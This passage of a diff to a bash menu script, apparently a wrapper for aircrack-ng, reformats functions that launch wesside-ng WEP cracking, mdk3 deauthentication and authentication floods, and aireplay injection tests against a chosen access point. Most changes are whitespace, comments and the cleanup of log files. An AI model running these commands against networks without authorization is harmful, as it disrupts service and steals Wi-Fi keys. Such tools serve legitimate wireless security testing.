 }
 function wessidetarget {
-	xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e wesside-ng -v $Host_MAC -i $WIFI & choosewesside
+rm -rf prga.log
+rm -rf wep.cap
+rm -rf key.log
+xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e wesside-ng -v $Host_MAC -i $WIFI & choosewesside
 }
 function wessidenewtarget {
+rm -rf prga.log
+rm -rf wep.cap
+rm -rf key.log
 ap_array=`cat $DUMP_PATH/dump-01.txt | grep -a -n Station | awk -F : '{print $1}'`
 head -n $ap_array $DUMP_PATH/dump-01.txt &> $DUMP_PATH/dump-02.txt
 clear
@@ -1122,8 +1053,7 @@ Host_CHAN=$channel
 acouper=${#ssid}
 fin=$(($acouper-idlength))
 Host_SSID=${ssid:1:fin}
-
-	xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e wesside-ng -v $Host_MAC -i $WIFI & choosewesside
+xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e wesside-ng -v $Host_MAC -i $WIFI & choosewesside
 }
 function choosemdk {
 while true; do
@@ -1150,10 +1080,10 @@ while true; do
 done 
 }
 function mdkpain {
-	xterm $HOLD $TOPLEFTBIG -title "MDK attack" -bg "#000000" -fg "#1DFF00" -e mdk3 $WIFI d & choosemdk
+xterm $HOLD $TOPLEFTBIG -title "MDK attack" -bg "#000000" -fg "#1DFF00" -e mdk3 $WIFI d & choosemdk
 }
 function mdktargetedpain {
-	xterm $HOLD $TOPLEFTBIG -title "MDK attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e mdk3 $WIFI p -b a -c $Host_CHAN -t $Host_MAC & choosemdk
+xterm $HOLD $TOPLEFTBIG -title "MDK attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e mdk3 $WIFI p -b a -c $Host_CHAN -t $Host_MAC & choosemdk
 }
 function mdknewtarget {
 ap_array=`cat $DUMP_PATH/dump-01.txt | grep -a -n Station | awk -F : '{print $1}'`
@@ -1197,19 +1127,14 @@ Host_SSID=${ssid:1:fin}
 choosemdk
 }
 function mdkauth {
-
-	xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e mdk3 $WIFI a & choosemdk
+xterm $HOLD $TOPLEFTBIG -title "Wesside-ng attack on AP: $Host_SSID" -bg "#000000" -fg "#1DFF00" -e mdk3 $WIFI a & choosemdk
 }
-
-
 function inject_test {
-	xterm $HOLD $TOPLEFTBIG -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --test & menufonction
+xterm $HOLD $TOPLEFTBIG -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --test & menufonction
 }
-
 function menufonction {
 xterm $HOLD $TOPRIGHT -title "Fake function to jump to menu" -e echo "Aircrack-ng is a great tool, Mister_X ASPj HIRTE are GODS"
 }
-
 function checkdir {
 if [[ -d $DUMP_PATH ]]
 then
@@ -1217,7 +1142,7 @@ echo "        Output folder is $DUMP_PATH"
 echo ""
 else
 echo "        Output folder does not exist, i will create it now"
-        mkdir $DUMP_PATH
+mkdir $DUMP_PATH
 echo "        Output folder is now set to $DUMP_PATH"
 fi
 }
@@ -1236,7 +1161,7 @@ echo "Than you could set your interface and check binaries path"
 echo "If you encounter errors please set the variable DEBUG to 1"
 echo "This will allow you to see errors messages in xterm"
 sleep 10
-	else
+else
 echo ""
 fi
 }
@@ -1245,20 +1170,23 @@ fi
 #
 # Main Section this is the "menu" part, where all the functions are called		
 #
-#      
-	greetings
-	debug
-	checkdir
-	setinterface
-	menu	
+# 
+#displays welcome msg     
+greetings
+#runs debug routine to set $HOLD value
+debug
+#checks if output dir exists
+checkdir
+#checks if interface is set, if not it ask you
+setinterface
+#displays main menu
+menu	
 select choix in $CHOICES; do					
 	if [ "$choix" = "1" ]; then
 	choosetype
 	choosescan
 	clear
-	menu
-        echo "#######################################"
-	echo "### Airodump closed, select a target###"				
+	menu			
 	elif [ "$choix" = "2" ]; then
 	Parseforap
 	clear
@@ -1277,11 +1205,6 @@ select choix in $CHOICES; do
 	menu
 	fi					
 	elif [ "$choix" = "3" ]; then
-#	$AIRMON start $WIFI $Host_CHAN
-#	iwconfig $WIFI rate $Host_SPEED"M"
-#	iwconfig $WIFI rate 1M
-#	echo "iwconfig $WIFI rate $Host_SPEED"M""
-#	echo "iwconfig $WIFI rate 1"M""
 	witchattack	
 	menu
 	elif [ "$choix" = "4" ]; then
@@ -1310,4 +1233,3 @@ select choix in $CHOICES; do
 	fi
 done
 #END
-
